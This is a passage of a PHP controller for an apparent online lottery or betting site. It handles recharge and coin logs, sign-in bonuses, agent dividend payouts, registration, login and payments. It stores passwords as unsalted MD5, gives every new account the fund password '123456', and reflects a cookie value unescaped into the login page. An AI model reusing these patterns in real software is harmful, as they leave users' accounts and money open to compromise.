            'actionTime[<>]' => [strtotime($date_start), strtotime($date_end)],
            'ORDER' => ['actionTime' => 'DESC'],
            'LIMIT' => [0, 20]
        ]);
        $this->api_return("success", 200, $data);
    }

    public function recharge()
    {
        $this->user_check_func();
        if ($this->post) {
            $this->get_time();
            $page_current = $this->get_page();
            $search_log = $this->recharge_search_func($page_current);
            $page_max = $this->get_page_max($search_log['total']);
            if ($page_current > $page_max) core::__403();
            $page_args = $this->page_args();
            $container = '#recharge-log .body';
            if ($this->ispage) {
                $this->display('/user/recharge_body', array(
                    'data' => $search_log['data'],
                    'page_current' => $page_current,
                    'page_max' => $page_max,
                    'page_url' => '/user/recharge?' . http_build_query($page_args),
                    'page_container' => $container,
                ));
            } else {
                $this->display('/user/recharge', array(
                    'data' => $search_log['data'],
                    'page_current' => $page_current,
                    'page_max' => $page_max,
                    'page_url' => '/user/recharge?' . http_build_query($page_args),
                    'page_container' => $container,
                ));
            }
        } else {
            $this->ajax();
        }
    }


    public function recharge_info()
    {
        $this->user_check_func();
        $this->check_post();
        $id = $this->get_id();
        $sql = "SELECT a.rechargeId,a.amount,a.rechargeAmount,a.info,a.state,a.actionTime,b.name as bankName FROM `{$this->db_prefix}member_recharge` a LEFT JOIN `{$this->db_prefix}bank_list` b ON b.id=a.bankId WHERE a.id={$id} LIMIT 1";
        $data = $this->db->query($sql, 2);
        if (!$data) core::__403();
        $html = '<div class="detail">';
        $html .= '<table cellpadding="0" cellspacing="0" width="100%">';
        $html .= '<tr>';
        $html .= '<td class="k">充值编号</td>';
        $html .= '<td class="v">' . $data['id'] . '</td>';
        $html .= '<td class="k">充值金额</td>';
        $html .= '<td class="v">' . $data['amount'] . '</td>';
        $html .= '</tr>';
        $html .= '<tr>';
        $html .= '<td class="k">充值银行</td>';
        $html .= '<td class="v">' . ($data['bankName'] ? $data['bankName'] : '--') . '</td>';
        $html .= '<td class="k">实际到账</td>';
        $html .= '<td class="v">' . ($data['rechargeAmount'] > 0 ? $data['rechargeAmount'] : '--') . '</td>';
        $html .= '</tr>';
        $html .= '<tr>';
        $html .= '<td class="k">充值状态</td>';
        $html .= '<td class="v">' . ($data['state'] ? '充值成功' : '<span class="green">正在处理</span>') . '</td>';
        $html .= '<td class="k">成功时间</td>';
        $html .= '<td class="v">' . ($data['state'] ? date('m-d H:i:s', $data['actionTime']) : '--') . '</td>';
        $html .= '</tr>';
        $html .= '<tr>';
        $html .= '<td class="k">充值备注</td>';
        $html .= '<td class="v" colspan="3">' . ($data['info'] ? $data['info'] : '--') . '</td>';
        $html .= '</tr>';
        $html .= '</table>';
        $html .= '</div>';
        $this->dialogue(array(
            'class' => 'mid',
            'body' => $html,
            'yes' => array('text' => '确定'),
        ));
    }

    private function page_args()
    {
        $page_args = array();
        if ($this->request_time_from) $page_args['fromTime'] = date('Y-m-d H:i', $this->request_time_from);
        if ($this->request_time_to) $page_args['toTime'] = date('Y-m-d H:i', $this->request_time_to);
        $page_args['page'] = '{page}';
        return $page_args;
    }

    private function recharge_search_func($page_current)
    {
        $uid = $this->user['uid'];
        $pagesize = $this->pagesize;
        $skip = ($page_current - 1) * $pagesize;
        $sql = "SELECT ~field~ FROM `{$this->db_prefix}member_recharge` a LEFT JOIN `{$this->db_prefix}payments` b ON b.id=a.payment_id WHERE a.isDelete=0 AND a.uid={$uid}" . $this->build_where_time('a.actionTime') . " ~order~ ~limit~";
        $sql_total = str_replace('~field~', 'COUNT(1) AS __total', $sql);
        $sql_total = str_replace('~limit~', '', $sql_total);
        $sql_total = str_replace('~order~', '', $sql_total);
        $total = $this->db->query($sql_total, 2);
        $total = $total['__total'];
        $sql_data = str_replace('~field~', 'a.rechargeId,a.amount,a.rechargeAmount,a.info,a.state,a.actionTime,b.title as payment_title', $sql);
        $sql_data = str_replace('~limit~', "LIMIT $skip,$pagesize", $sql_data);
        $sql_data = str_replace('~order~', 'ORDER BY a.id DESC', $sql_data);
        $data = $this->db->query($sql_data, 3);
        return array(
            'data' => $data,
            'total' => $total,
        );
    }

    public function fresh()
    {
        $this->check_post();
        $this->user_check_func(); // 用户登录检查
        $this->fresh_user_session(); // 刷新用户session
        // 更新用户级别
        $uid = $this->user['uid'];
        $score = $this->user['scoreTotal'];
        $new_grade = $this->db->query("SELECT MAX(`level`) AS `value` from `{$this->db_prefix}member_level` WHERE `minScore` <= {$score} LIMIT 1", 2);
        $new_grade = $new_grade['value'];
        if ($new_grade > $this->user['grade']) {
            $sql = "UPDATE `{$this->db_prefix}members` SET `grade`={$new_grade} WHERE `uid`=$uid LIMIT 1";
            $this->db->query($sql, 0);
            $this->user['grade'] = $new_grade;
        }
        $tmpUser = [];
        $tmpUser['username'] = $this->user['username'];
        $tmpUser['fcoin'] = $this->user['fcoin'];
        $tmpUser['scoreTotal'] = $this->user['scoreTotal'];
        $tmpUser['score'] = $this->user['score'];
        $tmpUser['grade'] = $this->user['grade'];
        $tmpUser['day_rate'] = $this->user['day_rate'];
        $tmpUser['user_tag'] = $this->user['user_tag'];
        $tmpUser['coin'] = $this->user['coin'];
        $this->api_return("success", 200, $tmpUser);
    }

    public function sign()
    {
        $this->user_check_func();
        $type = 50;
        $uid = $this->user['uid'];
        $today = strtotime('today');
        $coin = floatval($this->config['huoDongSign_coin']);
        $bonus = floatval($this->config['huoDongSign_bonus']);
        if ($this->user['coin'] < $coin) core::error('账户余额至少为<span class="btn btn-red">' . $coin . '</span>元才能才加此活动');
        if (!$bonus) core::error('每日签到活动已结束');
        $sql = "SELECT `id` FROM `{$this->db_prefix}member_bank` WHERE `uid`={$uid} AND `enable`=1 LIMIT 1";
        if (!$this->db->query($sql, 2)) {
            core::error('设置银行账户后才能参与此活动');
        }
        $sql = "SELECT `id` FROM `{$this->db_prefix}coin_log` WHERE `actionTime`>={$today} AND `liqType`={$type} AND `uid`={$uid} LIMIT 1";
        if ($this->db->query($sql, 2)) core::error('今天您已经签到过了');
        $this->set_coin(array(
            'info' => '签到活动',
            'liqType' => $type,
            'coin' => $bonus,
        ));
        $this->api_return('签到成功，系统赠送您<span class="btn btn-red">' . $bonus . '</span>元，请注意查收');
    }

    public function coin()
    {
        $this->user_check_func();
        if ($this->post) {
            $tpl = $this->ispage ? '/user/coin_body' : '/user/coin';
            $this->get_time();
            $type = $this->coin_get_type();
            $page_current = $this->get_page();
            $coin_log = $this->coin_search_func($type, $page_current);
            $page_max = $this->get_page_max($coin_log['total']);
            if ($page_current > $page_max) core::__403();
            $page_args = $this->coin_page_args($type);
            $this->display($tpl, array(
                'type' => $type,
                'data' => $coin_log['data'],
                'page_current' => $page_current,
                'page_max' => $page_max,
                'page_url' => '/user/coin?' . http_build_query($page_args),
                'page_container' => '#coin-log .body',
            ));
        } else {
            $this->ajax();
        }
    }

    //api获取
    public function api_user_coin()
    {
        $this->user_check_func();
        $type = $_REQUEST["type"];

        $page = $this->request->request("page", 1, "intval");
        $uid = $this->user['uid'];
        $skip = ($page - 1) * $this->pagesize;

        //如果是一个集合类型
        $typeStr = "";
        $where_type = "";
        if (is_array($type)) {
            foreach ($type as $t) {
                $t = intval($t);
                $typeStr .= ",{$t}";
            }
            $where_type = " AND l.liqType in (0{$typeStr}) ";
        }

        $where_time = $this->build_where_time('l.actionTime');
        $sql = "SELECT ~field~ FROM `{$this->db_prefix}coin_log` l LEFT JOIN `{$this->db_prefix}bets` b ON b.id=l.extfield0 AND b.uid=l.uid WHERE l.uid={$uid} {$where_type} {$where_time} ~order~ ~limit~";
        $sql_total = str_replace('~field~', 'COUNT(1) AS __total', $sql);
        $sql_total = str_replace('~limit~', '', $sql_total);
        $sql_total = str_replace('~order~', '', $sql_total);
        $total = $this->db->query($sql_total, 2);
        $total = $total['__total'];
        $field = 'b.wjorderId,l.liqType,l.coin,l.fcoin,l.userCoin,l.actionTime,l.extfield0,l.extfield1,l.info';
        $sql_data = str_replace('~field~', $field, $sql);
        $sql_data = str_replace('~limit~', "LIMIT $skip,$this->pagesize", $sql_data);
        $sql_data = str_replace('~order~', 'ORDER BY l.id DESC', $sql_data);
        $data = $this->db->query($sql_data, 3);
        $json["data_list"] = $data;
        $this->api_return("suc", 200, $json);
    }

    public function coin_search()
    {
        $this->user_check_func();
        $this->check_post();
        $this->get_time(false);
        $type = $this->coin_get_type(false);
        $coin_log = $this->coin_search_func($type, 1);
        $page_max = $this->get_page_max($coin_log['total']);
        $page_args = $this->coin_page_args($type);
        $this->display('/user/coin_body', array(
            'type' => $type,
            'data' => $coin_log['data'],
            'page_current' => 1,
            'page_max' => $page_max,
            'page_url' => '/user/coin?' . http_build_query($page_args),
            'page_container' => '#coin-log .body',
        ));
    }

    private function coin_search_func($type, $page_current)
    {
        $uid = $this->user['uid'];
        $pagesize = $this->pagesize;
        $skip = ($page_current - 1) * $pagesize;
        $where_type = $type ? " AND l.liqType={$type} " : '';
        $where_time = $this->build_where_time('l.actionTime');
        $sql = "SELECT ~field~ FROM `{$this->db_prefix}coin_log` l LEFT JOIN `{$this->db_prefix}bets` b ON b.id=l.extfield0 AND b.uid=l.uid WHERE l.uid={$uid} $where_type $where_time ~order~ ~limit~";
        $sql_total = str_replace('~field~', 'COUNT(1) AS __total', $sql);
        $sql_total = str_replace('~limit~', '', $sql_total);
        $sql_total = str_replace('~order~', '', $sql_total);
        $total = $this->db->query($sql_total, 2);
        $total = $total['__total'];
        $field = 'b.wjorderId,l.liqType,l.coin,l.fcoin,l.userCoin,l.actionTime,l.extfield0,l.extfield1,l.info';
        $sql_data = str_replace('~field~', $field, $sql);
        $sql_data = str_replace('~limit~', "LIMIT $skip,$pagesize", $sql_data);
        $sql_data = str_replace('~order~', 'ORDER BY l.id DESC', $sql_data);
        $data = $this->db->query($sql_data, 3);
        return array(
            'data' => $data,
            'total' => $total,
        );
    }

    private function coin_get_type($get = true)
    {
        $data = $get ? $_GET : $_POST;
        return (array_key_exists('type', $data) && array_key_exists($data['type'], $this->coin_types)) ? intval($data['type']) : 0;
    }

    private function coin_page_args($type)
    {
        $page_args = array();
        if ($type) $page_args['type'] = $type;
        if ($this->request_time_from) $page_args['fromTime'] = date('Y-m-d H:i', $this->request_time_from);
        if ($this->request_time_to) $page_args['toTime'] = date('Y-m-d H:i', $this->request_time_to);
        $page_args['page'] = '{page}';
        return $page_args;
    }

    public function logout()
    {
        unset($_SESSION[$this->user_session]);
		unset($_SESSION['username']);
        if ($this->user && array_key_exists('uid', $this->user)) {
            $uid = $this->user['uid'];
            $this->db->update("{$this->db_prefix}member_session", array("isOnLine" => 0), array('uid' => $uid));
        }
        $url_login = '/user/login?client_type=' . $this->client_type;
        header('Location: ' . $url_login);
    }


#region 报表模块
    //发放分红
    public function push_qy_red()
    {

    }

    private function qy_fx_enable()
    {

        $timeNow = time();
        $time1Start = strtotime(date("Y-m-16"));
        $time1End = strtotime(date("Y-m-17"));
        if ($timeNow >= $time1Start && $timeNow <= $time1End) {
            return 2;
        }
        $time2Start = strtotime(date("Y-m-1"));
        $time2End = strtotime(date("Y-m-2"));
        if ($timeNow >= $time2Start && $timeNow <= $time2End) {
            return 1;
        }
        return 0;
    }

    //last
    private function get_user_fh_real($uid)
    {
        $total = array();
        $user_qy_fx = array();

        $last = array();
        $time = time();
        $dateTime = strtotime(date("Y-m-16"));
        if ($dateTime < $time) {
            //如果已经是下半个月，那么就获取上半月的
            $last['start_date'] = date("Y-m-1");
            $last['end_date'] = date("Y-m-15");
            $total["cycle"] = 1;
        } else {
            //如果是上半月，就获取上个月 上半月的
            $last['start_date'] = date("Y-m-16", strtotime("-1month"));
            //上个月末
            $nextM = strtotime(date("Y-m-1") . '-1day');
            $last['end_date'] = date("Y-m-d", $nextM);
            $total["cycle"] = 2;
        }
        $user_qy_fx["last"] = $last;
        $tmp = array(
            "need_coin" => 0,
            "team_coin" => 0,
        );
        $user_qy_fx["had"] = 0;
        $user_qy_fx["fh_msg"] = $tmp;
        //获取用户
        $user = $this->DBC->get("members", [
            "uid",
            "type",
            "qy_mode",
        ], ["uid" => $uid]);

        $user_qy_fx["user"] = $user;
        $hadSend = 0;
        if ($user['type'] == 1) {
            //团队销量
            $playMoney = $this->get_team_tze($user['uid'], strtotime($last["start_date"]), strtotime($last['end_date']));
            $playMoney = abs($playMoney);
            $fhConfig = $this->_get_user_fh($user['uid'], $playMoney);
            $user_qy_fx["fh_config"] = $fhConfig;
            $user_qy_fx["play_money"] = $playMoney;
            if (!$fhConfig) {
                return $user_qy_fx;
            }

            if ($user["qy_mode"] == 1) {
                //如果是累计分红,1
                if ($total["cycle"] == 1) {
                    //1-15号的周期
                    //获取亏盈
                    $coin = $this->get_team_ky($user['uid'], strtotime($last["start_date"]), strtotime($last['end_date']));
                    if ($coin < 0) {
                        //这里去查询分红比例
                        $tmp["team_coin"] = abs($coin);
                        $tmp["need_coin"] = $fhConfig["red_rate"] * $tmp["team_coin"] / 100;
                    }
                } else if ($total["cycle"] == 2) {
                    //16-月末的周期
                    //获取亏盈
                    $coin = $this->get_team_ky($user['uid'], strtotime($last["start_date"]), strtotime($last['end_date']));
                    if ($coin < 0) {
                        //获取上期亏盈
                        $last_coin = $this->get_team_ky($user['uid'], strtotime(date("Y-m-1")), strtotime(date("Y-m-15")));
                        if ($last_coin > 0) {
                            $coin += $last_coin;
                        }
                        if ($coin <= 0) {
                            //这里去查询分红比例
                            $tmp["team_coin"] = abs($coin);
                            $tmp["need_coin"] = $fhConfig["red_rate"] * $tmp["team_coin"] / 100;
                        }
                    }
                }

            } else {
                //如果是不累计分红，直接计算半月,0
                #region                //获取亏盈
                $coin = $this->get_team_ky($user['uid'], strtotime($last["start_date"]), strtotime($last['end_date']));
                if ($coin < 0) {
                    //这里去查询分红比例
                    $tmp["team_coin"] = abs($coin);
                    $tmp["need_coin"] = $fhConfig["red_rate"] * $tmp["team_coin"] / 100;
                }
                #endregion
            }

            //获取已经发放的分红
            $had = $this->_get_last_qyfh($user['uid'], ($last["start_date"]), ($last['end_date']));
            if ($had) {
                $hadSend += floatval($had["total"]);
            }
        }
        $tmp["team_coin"] = number_format($tmp['team_coin'], 3, ".", "");
        $tmp["need_coin"] = number_format($tmp['need_coin'], 3, ".", "");
        $user_qy_fx["fh_msg"] = $tmp;
        $user_qy_fx["had"] = $hadSend;
        return $user_qy_fx;
    }

    public function report_table()
    {
        $this->user_check_func();
        //获取最新的发放记录
        if ($this->user["type"] != 1) {
            core::error("对不起,你不是代理会员", "/");
        }
        $total = array();
        $total["click_enable"] = $this->qy_fx_enable();
#region SELF START
        $last_qy = $this->get_user_fh_real($this->user["uid"]);
        if (!array_key_exists("fh_config", $last_qy)) {
            $last_qy["fh_config"]["red_rate"] = 0;
        }
#endregion

        //这个地方去获取
        #region 获取应该分红
        //获取
        $needSend = 0;
        $hadSend = 0;
        //获取一级节点
        $children = $this->_getChildren("uid", 1, $this->user["uid"]);
        foreach ($children as $child) {
            $fh = $this->get_user_fh_real($child["uid"]);
            if (!$fh || !$fh["fh_config"]) {
                continue;
            }
            $needSend += $fh["fh_msg"]['need_coin'];
            $hadSend += $fh["had"];
        }
        #endregion
        $total["last_self"] = $last_qy;
        $total["need_child_send"] = round($needSend, 3);
        $total["had_child_send"] = round($hadSend, 3);
        $total["not_child_send"] = abs(round($needSend - $hadSend, 1));

        $this->smarty->assign("total", $total);
        $this->smarty->display("user/report_table.tpl");
    }

    public function api_send_qy_red()
    {
        $this->user_check_func();
        //获取直属会员
        $enable = $this->qy_fx_enable();
        if (!$enable) {
            $this->api_err_return("对不起,未到分红时间");
        }
        $children = $this->_getChildren("uid,type,qy_mode", 1, $this->user["uid"]);
        $send_coin = 0;
        foreach ($children as $child) {
            if ($child["type"] != 1) {
                continue;
            }
            $fh = $this->get_user_fh_real($child['uid']);
            if (($fh["fh_msg"]["need_coin"] - $fh['had']) <= 0) {
                continue;
            }
            //TODO  添加事务，检查用户余额
            if (($fh["had"] + 10) <= $fh['fh_msg']['need_coin']) {
                //给这个下级增加
                $this->set_user_coin(array(
                    'uid' => $child['uid'],
                    'type' => "",
                    'playedId' => "",
                    'liqType' => 201,
                    'info' => '契约分红收入',
                    'extfield0' => $fh['last']["start_date"],
                    'extfield1' => $fh['fh_config']["red_rate"],
                    'coin' => $fh["fh_msg"]["need_coin"],
                ));
                $send_coin += $fh["fh_msg"]["need_coin"];
                //上级减少
                $this->set_user_coin(array(
                    'uid' => $this->user['uid'],
                    'type' => "",
                    'playedId' => "",
                    'liqType' => 202,
                    'info' => '契约分红支出',
                    'extfield0' => $fh['last']["start_date"],
                    'extfield1' => $fh['fh_config']["red_rate"],
                    'coin' => $fh["fh_msg"]["need_coin"] * -1,
                ));
                //添加日志
                $this->DBC->insert("member_contract_logs", [
                    "uid" => $child['uid'],
                    "use_id" => $fh['fh_config']["id"],
                    "team_coin" => $fh['fh_msg']['team_coin'],
                    "red_rate" => $fh['fh_config']['red_rate'],
                    "mode" => $child['qy_mode'],
                    "status" => 1,
                    "send_coin" => $fh['fh_msg']["need_coin"],
                    "send_time" => time(),
                    "send_date" => date("Y-m-d"),
                    "start_date" => $fh['last']["start_date"],
                    "end_date" => $fh['last']["end_date"],
                    "need_coin" => $fh['fh_msg']["need_coin"],

                ]);
            }
        }
        $this->api_return("分红发放成功,您消费:{$send_coin}");
    }

    /**
     * 获取团队投注额度
     */
    protected function get_team_tze($pid, $timeStart, $timeEnd)
    {
        //获取团队亏盈
        $children = $this->_getChildren("uid", 0, $pid);
        $uids = array(0);
        foreach ($children as $c) {
            array_push($uids, $c["uid"]);
        }
        $uids = array_unique($uids);
        //统计亏盈
        $total = $this->DBC->sum("coin_log", [
            "[>]members" => ["uid" => "uid"],
        ], "coin_log.coin", array("coin_log.uid" => $uids, "coin_log.actionTime[<>]" => [$timeStart, $timeEnd], "coin_log.liqType" => array(101, 102, 5, 7)));
        return $total;
    }


    protected function get_team_ky($pid, $timeStart, $timeEnd)
    {
        //获取团队亏盈
        $children = $this->_getChildren("uid", 0, $pid);
        $uids = array(0);
        foreach ($children as $c) {
            array_push($uids, $c["uid"]);
        }
        //统计亏盈
        $total = $this->DBC->sum("coin_log", "coin_log.coin", array("coin_log.uid" => $uids, "coin_log.actionTime[<>]" => [$timeStart, $timeEnd], "coin_log.liqType" => array(101, 108, 102, 5, 6, 7)));
        return $total;
    }


    //获取用户分红配置
    private function _get_user_fh($uid, $coin)
    {
        $coin = abs($coin);
        $sql = <<<SQL
SELECT * FROM `{$this->db_prefix}member_contract` WHERE `uid`={$uid} AND `need_sale`<={$coin} ORDER BY `need_sale` DESC LIMIT 1
SQL;
        return $this->db->query($sql, 2);
    }

    private function _get_last_qyfh($uid, $dateStart, $dateEnd)
    {
        $sql = <<<SQL
SELECT SUM(`send_coin`) as total FROM `{$this->db_prefix}member_contract_logs` WHERE `uid`={$uid} AND `start_date`>='{$dateStart}' AND `end_date`<='{$dateEnd}' ORDER BY `send_date` DESC LIMIT 1
SQL;
        return $this->db->query($sql, 2);
    }

#endregion

    //个人报表
    public function coin_table()
    {
        ///统计个人的资金信息
        $this->user_check_func();

        //获取报表信息
        if ($this->IsAjax) {
            $start_date = $this->request->request("search.start_time");
            $end_date = $this->request->request("search.end_time");
            $startTime = strtotime($start_date);
            $endTime = strtotime($end_date . " +1day");
            $logs = $this->DBC->select("coin_log", "*", [
                'uid' => $this->user['uid'],
                'actionTime[>]' => $startTime,
                'actionTime[<]' => $endTime
            ]);
            //group
            $logs = $this->DBC->query("select sum(coin) as coin_total,liqType,DATE_FORMAT(FROM_UNIXTIME(actionTime),'%Y-%m-%d') as date 
from lottery_coin_log WHERE `actionTime`>={$startTime} AND `actionTime`<={$endTime} AND `uid`={$this->user['uid']} GROUP BY DATE_FORMAT(FROM_UNIXTIME(actionTime),'%Y-%m-%d'),liqType;")->fetchAll();

            $data = array();
            //生成key
            for ($i = $endTime; $i >= $startTime; $i -= (24 * 3600)) {
                $data[date("Y-m-d", $i)] = array(
                    'pay_in' => 0.000,
                    'pay_out' => 0.000,
                    'used' => 0.000,
                    'send_coin' => 0.000,
                    'fan_dian' => 0.000,
                    'activity' => 0.000,
                    'win' => 0.000,
                    'other' => 0.000
                );
            }
            foreach ($logs as $log) {
                $keyIndex = "other";
                if ($log['liqType'] == 1 || $log['liqType'] == 0) {
                    $keyIndex = "pay_in";
                } else if ($log['liqType'] == 106 || $log['liqType'] == 107) {
                    $keyIndex = "pay_out";
                } else if ($log['liqType'] == 101 || $log['liqType'] == 108 || $log['liqType'] == 102 || $log['liqType'] == 5 || $log['liqType'] == 255 || $log['liqType'] == 7) {
                    //5, 7, 101, 102, 255, 108
                    $keyIndex = "used";
                } else if ($log['liqType'] == 6) {
                    $keyIndex = "send_coin";
                } else if ($log['liqType'] == 2) {
                    $keyIndex = "fan_dian";
                } else if ($log['liqType'] == 167 || $log['liqType'] == 50 || $log['liqType'] == 120 || $log['liqType'] == 121 || $log['liqType'] == 201 || $log['liqType'] == 51) {
                    $keyIndex = "activity";
                }
                $data[$log['date']][$keyIndex] += $log['coin_total'];
            }

            //计算盈利
            foreach ($data as $key => &$val) {
                $val['win'] = $val['used'] + $val['send_coin'] + $val['activity'] + $val['fan_dian'];
            }

            $this->api_return("success", 200, $data);
        } else {
            $this->smarty->display("user/coin_table.tpl");
        }
    }

    /**
     * 注册
     */
    public function reg()
    {
		if($this->config['switchreg']=='0'){
			$this->api_err_return('暂未开放注册');
		}
        if (array_key_exists($this->user_session, $_SESSION) && $_SESSION[$this->user_session]) unset($_SESSION[$this->user_session]);
        if ($this->post) {
            $lid = $this->request->request("pid", 0, "intval");
            $username = $this->request->request("username");
            $password = $this->request->request("pwd");
            $re_pwd = $this->request->request("re_pwd");
            $qq = $this->request->request("qq");

            //验证码
            $verify_code = $this->request->request("verify_code");
            $verify = core::lib("verify");
            if (!$verify->check($verify_code, 1)) {
                $this->api_err_return("对不起，验证码错误");
            }

            if ($username === '') $this->api_err_return('账户名不能为空');
            if (!core::lib('validate')->username($username)) $this->api_err_return('账户名格式错误');

            if ($this->db->find("{$this->db_prefix}members", array('username' => $username))) {
                $this->api_err_return('账户名已存在');
            }
            if ($password === '') $this->api_err_return('登录密码不能为空');
            if ($password !== $re_pwd) $this->api_err_return('两次输入的密码不一致');


            $ip = $this->ip(true);

            $defaultFandian = floatval($this->config['defaultFandian']);
            if (!$lid && !$defaultFandian) {
                $this->api_err_return('系统已关闭直接注册，请通过邀请链接注册');
            }
            //查询链接
            $link = $lid ? $this->db->find("{$this->db_prefix}links", array("lid" => $lid)) : null;
            if ($lid > 0 && !is_array($link)) {
                //链接失效
                $this->api_err_return('该链接已失效，请联系您的上级重新索取注册链接');
            }
            if (isset($link['uid'])) {
                //关联父级
                $parents = $this->db->find("{$this->db_prefix}members", array('uid' => $link["uid"]), "parents");
                $parents = $parents['parents'];
                $source = 1;
            } else {
                //0是管理员
                $parents = 0;
                $source = 0;
            }
            $para = array(
                'source' => $source,
                'username' => $username,
                'type' => isset($link['type']) ? $link['type'] : 0,
                'password' => md5($password),
                'parentId' => $link ? $link['uid'] : 0,
                'parents' => $link ? $parents : 0,
                'fanDian' => $link ? $link['fanDian'] : $defaultFandian,
                'regIP' => $ip,
                'regTime' => $this->time,
                'coin' => 0,
                'qq' => $qq,
                'fcoin' => 0,
                'score' => 1,
                'day_rate' => 0,
                'scoreTotal' => 0,
				'coinPassword'=> md5('123456'),
            );
            if ($para["type"] == 1) {
                $para["qy_red_max_rate"] = $this->user["qy_red_max_rate"];
                $para["qy_red_min_rate"] = $this->user["qy_red_min_rate"];
            }

            try {
                $this->db->transaction('begin');
                $id = $this->db->insert($this->db_prefix . 'members', $para);
                if ($id) {
                    $sql = "UPDATE `{$this->db_prefix}members` SET `parents`=CONCAT(parents, ',', $id) WHERE `uid`=$id LIMIT 1";
                    $this->db->query($sql, 0);
                    if ($lid) $this->db->query("UPDATE `{$this->db_prefix}links` SET `usedTimes`=`usedTimes`+1,`updateTime`={$this->time} WHERE `lid`=$lid LIMIT 1", 0);
                    $zczs = intval($this->config['zczs']);
                    if ($zczs > 0) {
                        $this->set_coin(array(
                            'uid' => $id,
                            'liqType' => 55,
                            'info' => '注册奖励',
                            'coin' => $zczs,
                        ));
                    }
                    $this->db->transaction('commit');
                    $str = $zczs !== 0 ? '注册成功，系统赠送您 ' . $zczs . ' 元' : '注册成功';
                    //url
                    $this->api_return($str, 200, array("url" => "/user/login"));
                } else {
                    $this->db->transaction('rollBack');
                    $this->api_err_return('注册会员失败，请稍后重试或者联系管理员');
                }
            } catch (Exception $e) {
                $this->db->transaction('rollBack');
                $this->api_err_return("注册会员失败，请稍后重试或者联系管理员.{$e->getMessage()}");
            }
        } else {
            $args = array('lid' => 0);
            $id = (array_key_exists('id', $_GET) && core::lib('validate')->reg_code($_GET['id'])) ? $_GET['id'] : '';
            if ($id) {
                $lid = $this->myxor($this->hex2str($id));
                if (is_numeric($lid)) {
                    $link = $this->db->query("SELECT * FROM `{$this->db_prefix}links` WHERE lid={$lid} LIMIT 1", 2);
                    if ($link && $link['enable']) $args['lid'] = $lid;
                }
            }
            $this->display('/user/reg', $args);
        }
    }

    /**
     * 登陆
     */
    public function login()
    {
        if ($this->post) {
            $username = $this->request->request("username");
            $password = $this->request->request("pwd");
            $app_mode = $this->request->request("app_mode");

            //验证码验证
            $verify_code = $this->request->request("verify_code");
            $verify = core::lib("verify");
            if (!$verify->check($verify_code, 1)) {
                $this->api_err_return("对不起，验证码错误");
            }

            if ("" === $username) $this->api_err_return('账户名不能为空');
            if ("" === $password) $this->api_err_return('登录密码不能为空');
            if (!core::lib('validate')->username($username)) $this->api_err_return('账户名格式错误');

            $user = $this->db->find("{$this->db_prefix}members", array("isDelete" => 0, "username" => $username));
            if (!$user) {
                $this->api_err_return('您输入的账户不存在');
            }
            if (md5($password) !== $user['password']) {
                $this->api_err_return('您输入的密码错误');
            }

            if (!$user['enable']) $this->api_err_return('您输入的账户已被冻结，请联系管理员');
            setcookie('username', $username, $this->time + 86400);
            $session = array(
                'uid' => $user['uid'],
                'username' => $user['username'],
                'session_key' => session_id(),
                'loginTime' => $this->time,
                'accessTime' => $this->time,
                'loginIP' => $this->ip(true)
            );
            $session = array_merge($session, $this->get_browser());

            //下线其他得账号
            $this->db->update("{$this->db_prefix}member_session", array("isOnLine" => 0, "state" => 1), array("uid" => $user['uid']));
            //登陆当前账号
            $session_id = $this->db->insert("{$this->db_prefix}member_session", $session);
            if ($session_id) $user['sessionId'] = $session_id;
			$_SESSION['username'] = $user['username'];
            $_SESSION[$this->user_session] = serialize($user);

            //移动端模式
            $url = "";
            if ($app_mode === "1") {
                $this->client_type = "mobile";
                $url = "/";
            } else {
                $this->client_type = "web";
                $url = "/";
            }
            $this->api_return("登陆成功", 200, array("url" => $url));
        } else {
            $username = array_key_exists('username', $_COOKIE) ? ' value = "' . $_COOKIE['username'] . '"' : '';
            $remember = (array_key_exists('remember', $_COOKIE) && $_COOKIE['remember'] == 1) ? ' checked' : '';

            $this->display('/user/login', array(
                'username' => $username,
                'remember' => $remember,
                'client_type' => $this->client_type,
            ));
        }
    }


    #region 支付模块
    /////////////////////////////////////////支付

    // 获取支付实例
    private function get_pay_instance($payment)
    {
        static $instance = array();
        if (!array_key_exists($payment['id'], $instance)) {
            try {
                require(PAY_DRIVER_PATH . $payment['driver'] . '/pay.php');
                $pay_class = 'pay_' . $payment['driver'];
                $instance[$payment['id']] = new $pay_class;
            } catch (Exception $ex) {
                $this->api_err_return("加载支付驱动失败");
            }
        }
        return $instance[$payment['id']];
    }

    //二维码生产
    public function create_qrcode()
    {

    }

    // 支付方法
    public function pay()
    {
        $this->user_check_func();
        $this->check_post();
        $payment_id = $this->request->request("payment_id", 0, "intval"); //获取金额
        $amount = $this->request->request("amount", 0, "floatval"); //获取金额
        //充值
        $amount = number_format($amount, 2, '.', '');
        if ($amount <= 0) $this->api_err_return('充值金额错误，请重新操作');
        $payment = $this->db->find("{$this->db_prefix}payments", array('id' => $payment_id));
        if (!$payment) core::error('支付方式不存在，请重新选择');

        if ($amount < $payment['min_pay']) $this->api_err_return('充值金额最低为 <span class="btn btn-red">' . $payment['min_pay'] . '</span> 元');
        if ($amount > $payment['max_pay']) $this->api_err_return('充值金额最高为 <span class="btn btn-red">' . $payment['max_pay'] . '</span> 元');

        $orderNo = core::createOrderNo();
        //数据库中增加会员充值记录

        /*$this->DBC->insert("member_recharge", array(
            'uid' => $this->user['uid'],
            'rechargeId' => $orderNo,
            'order_no' => $orderNo,
            'username' => $this->user['username'],
            'amount' => $amount,
            'payment_id' => $payment_id,
            'actionIP' => $this->ip(true),
            'actionTime' => $this->time,
            'info' => '用户充值',
        ));
        $id = $this->DBC->id();*/
		if($payment['driver']=='huimeng'){$orderNo = date("Y-m-dH-i-s");$orderNo = str_replace("-","",$orderNo);$orderNo .= rand(1000,2000);}
		$newrecharge = array(
            'uid' => $this->user['uid'],
            'rechargeId' => $orderNo,
            'order_no' => $orderNo,
            'username' => $this->user['username'],
            'amount' => $amount,
            'payment_id' => $payment_id,
            'actionIP' => $this->ip(true),
            'actionTime' => $this->time,
            'info' => '用户充值',
        );
        //$id = $this->db->insert("{$this->db_prefix}member_recharge", $newrecharge);

        //if (!$id) $this->api_err_return('更新充值提交记录到数据库失败，请重试');
		
        // 生成回调地址及返回地址
        $url_callback = 'http://' . $_SERVER['SERVER_NAME'] . ":" . $_SERVER["SERVER_PORT"] . "/user/pay_{$payment['driver']}_cb";
        $url_return = 'http://' . $_SERVER['SERVER_NAME'] . ":" . $_SERVER["SERVER_PORT"] . '/user/recharge';

        if ($payment['action_type'] == 'tran_bank') {
            //转账
            $this->_pay_bank_tran($payment['id'], $amount, $orderNo);
        } else if ($payment['action_type'] == 'travel') {
            //这里只是表单
